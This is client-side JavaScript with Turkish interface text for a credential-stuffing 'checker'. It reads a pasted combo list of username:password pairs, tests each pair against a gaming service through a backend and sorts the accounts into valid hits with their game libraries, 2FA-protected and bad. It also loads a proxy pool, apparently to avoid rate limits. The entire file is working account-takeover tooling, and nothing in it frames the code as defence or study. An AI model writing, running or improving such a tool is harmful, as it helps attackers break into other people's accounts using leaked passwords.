        let stats = { hit: 0, twofa: 0, bad: 0, error: 0 };
        let isRunning = false;
        let stopRequested = false;
        let comboLines = [];
        let currentIndex = 0;
        
        function switchTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.sidebar-item').forEach(item => {
                item.classList.remove('active');
            });
            
            document.getElementById('tab-' + tabName).classList.add('active');
            document.querySelector(`.sidebar-item[data-tab="${tabName}"]`).classList.add('active');
        }
        
        function addLog(message, type = 'info') {
            const container = document.getElementById('logContainer');
            const entry = document.createElement('div');
            entry.className = 'log-entry log-' + type;
            const time = new Date().toLocaleTimeString('tr-TR');
            entry.textContent = `[${time}] ${message}`;
            container.appendChild(entry);
            container.scrollTop = container.scrollHeight;
            
            while (container.children.length > 500) {
                container.removeChild(container.firstChild);
            }
        }
        
        function updateStats() {
            document.getElementById('statHit').textContent = stats.hit;
            document.getElementById('stat2fa').textContent = stats.twofa;
            document.getElementById('statBad').textContent = stats.bad;
            document.getElementById('statError').textContent = stats.error;
        }
        
        function addHit(username, password, games) {
            const container = document.getElementById('hitResults');
            const empty = container.querySelector('.result-empty');
            if (empty) empty.remove();
            
            const line = document.createElement('div');
            let text = `${username}:${password}`;
            if (games && games.length > 0) {
                text += ` | Games: ${games.join(', ')}`;
            } else {
                text += ' | Games: []';
            }
            line.textContent = text;
            container.appendChild(line);
            container.scrollTop = container.scrollHeight;
        }
        
        function addTwofa(username, password, type) {
            const container = document.getElementById('twofaResults');
            const empty = container.querySelector('.result-empty');
            if (empty) empty.remove();
            
            const line = document.createElement('div');
            line.textContent = `${username}:${password} | 2FA: ${type}`;
            container.appendChild(line);
            container.scrollTop = container.scrollHeight;
        }
        
        function updateProgress(current, total) {
            const percent = total > 0 ? (current / total * 100) : 0;
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('progressText').textContent = `${current}/${total} kontrol edildi (${percent.toFixed(1)}%)`;
        }
        
        async function checkSingle() {
            const username = document.getElementById('singleUser').value.trim();
            const password = document.getElementById('singlePass').value;
            
            if (!username || !password) {
                alert('Kullanıcı adı ve şifre girin!');
                return;
            }
            
            addLog(`Tek hesap kontrol: ${username}`, 'info');
            
            const formData = new FormData();
            formData.append('action', 'check_single');
            formData.append('csrf', CSRF_TOKEN);
            formData.append('username', username);
            formData.append('password', password);
            
            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                displaySingleResult(data);
                
                if (data.status === 'VALID' || data.status === 'VALID_NO_GAMES') {
                    addLog(`[HIT] ${username}`, 'hit');
                } else if (data.status === '2FA_APP' || data.status === '2FA_EMAIL') {
                    addLog(`[2FA] ${username}`, '2fa');
                } else if (data.status === 'BAD') {
                    addLog(`[BAD] ${username}`, 'bad');
                } else {
                    addLog(`[ERROR] ${username} - ${data.message}`, 'error');
                }
            } catch (e) {
                addLog(`Hata: ${e.message}`, 'error');
            }
        }
        
        function displaySingleResult(data) {
            const container = document.getElementById('singleResult');
            const content = document.getElementById('singleResultContent');
            container.style.display = 'block';
            
            let statusColor = 'var(--red)';
            let statusText = data.status;
            
            if (data.status === 'VALID' || data.status === 'VALID_NO_GAMES') {
                statusColor = 'var(--green)';
            } else if (data.status === '2FA_APP' || data.status === '2FA_EMAIL') {
                statusColor = 'var(--orange)';
            }
            
            let gamesHtml = '';
            if (data.games && data.games.length > 0) {
                gamesHtml = `<div style="margin-top: 10px;"><strong>Oyunlar (${data.games.length}):</strong><br>${data.games.join(', ')}</div>`;
            } else {
                gamesHtml = '<div style="margin-top: 10px; color: var(--dim);">Oyun listesi yok</div>';
            }
            
            content.innerHTML = `
                <div style="margin-bottom: 10px;">
                    <strong>Kullanıcı:</strong> ${data.username}<br>
                    <strong>Şifre:</strong> ${data.password}<br>
                    <strong>Durum:</strong> <span style="color: ${statusColor}; font-weight: 700;">${statusText}</span><br>
                    <strong>Mesaj:</strong> ${data.message || '-'}
                </div>
                ${gamesHtml}
            `;
        }
        
        function startCheck() {
            if (isRunning) return;
            
            const comboText = document.getElementById('comboInput').value.trim();
            if (!comboText) {
                alert('Combo listesi boş!');
                return;
            }
            
            comboLines = comboText.split('\n').filter(line => {
                line = line.trim();
                return line && line.includes(':');
            }).map(line => {
                const [user, pass] = line.split(':', 2);
                return { username: user.trim(), password: pass.trim() };
            }).filter(item => item.username && item.password);
            
            if (comboLines.length === 0) {
                alert('Geçerli combo bulunamadı!');
                return;
            }
            
            stats = { hit: 0, twofa: 0, bad: 0, error: 0 };
            currentIndex = 0;
            stopRequested = false;
            isRunning = true;
            
            updateStats();
            updateProgress(0, comboLines.length);
            
            document.getElementById('hitResults').innerHTML = '<div class="result-empty">Henüz hit yok...</div>';
            document.getElementById('twofaResults').innerHTML = '<div class="result-empty">Henüz 2FA yok...</div>';
            
            document.getElementById('btnStart').style.display = 'none';
            document.getElementById('btnStop').style.display = 'inline-flex';
            document.getElementById('spinner').classList.add('active');
            
            addLog(`Tarama başladı: ${comboLines.length} hesap`, 'info');
            
            processNextBatch();
        }
        
        function stopCheck() {
            stopRequested = true;
            addLog('Durdurma isteği gönderildi...', 'info');
        }
        
        async function processNextBatch() {
            if (stopRequested || currentIndex >= comboLines.length) {
                finishCheck();
                return;
            }
            
            const batchSize = 1;
            const batch = comboLines.slice(currentIndex, currentIndex + batchSize);
            currentIndex += batchSize;
            
            for (const combo of batch) {
                if (stopRequested) break;
                
                const formData = new FormData();
                formData.append('action', 'check_single');
                formData.append('csrf', CSRF_TOKEN);
                formData.append('username', combo.username);
                formData.append('password', combo.password);
                
                try {
                    const response = await fetch(window.location.href, {
                        method: 'POST',
                        body: formData
                    });
                    const data = await response.json();
                    
                    if (data.status === 'VALID' || data.status === 'VALID_NO_GAMES') {
                        stats.hit++;
                        addHit(data.username, data.password, data.games);
                        addLog(`[HIT] ${data.username} | Oyun: ${data.games.length}`, 'hit');
                    } else if (data.status === '2FA_APP') {
                        stats.twofa++;
                        addTwofa(data.username, data.password, 'App');
                        addLog(`[2FA-APP] ${data.username}`, '2fa');
                    } else if (data.status === '2FA_EMAIL') {
                        stats.twofa++;
                        addTwofa(data.username, data.password, 'Email');
                        addLog(`[2FA-EMAIL] ${data.username}`, '2fa');
                    } else if (data.status === 'BAD') {
                        stats.bad++;
                        addLog(`[BAD] ${data.username}`, 'bad');
                    } else if (data.status === 'RATE_LIMIT') {
                        stats.error++;
                        addLog(`[RATE-LIMIT] ${data.username}`, 'error');
                    } else {
                        stats.error++;
                        addLog(`[ERROR] ${data.username} - ${data.message}`, 'error');
                    }
                    
                    updateStats();
                    updateProgress(currentIndex, comboLines.length);
                    
                } catch (e) {
                    stats.error++;
                    addLog(`[ERROR] ${combo.username} - ${e.message}`, 'error');
                    updateStats();
                }
                
                await sleep(1500);
            }
            
            setTimeout(processNextBatch, 10);
        }
        
        function finishCheck() {
            isRunning = false;
            document.getElementById('btnStart').style.display = 'inline-flex';
            document.getElementById('btnStop').style.display = 'none';
            document.getElementById('spinner').classList.remove('active');
            updateProgress(comboLines.length, comboLines.length);
            
            addLog(`Tarama tamamlandı. HIT: ${stats.hit}, 2FA: ${stats.twofa}, BAD: ${stats.bad}, ERROR: ${stats.error}`, 'info');
        }
        
        async function refreshProxies() {
            addLog('Proxyler yenileniyor...', 'info');
            
            const formData = new FormData();
            formData.append('action', 'get_proxies');
            formData.append('csrf', CSRF_TOKEN);
            
            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                if (data.status === 'success') {
                    document.getElementById('proxyCount').textContent = data.count + ' proxy';
                    document.getElementById('proxyStatus').textContent = '✅ Aktif';
                    addLog(`${data.count} proxy yüklendi`, 'info');
                }
            } catch (e) {
                addLog(`Proxy yenileme hatası: ${e.message}`, 'error');
            }
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            if (PROXY_COUNT === 0) {
                refreshProxies();
            }
        });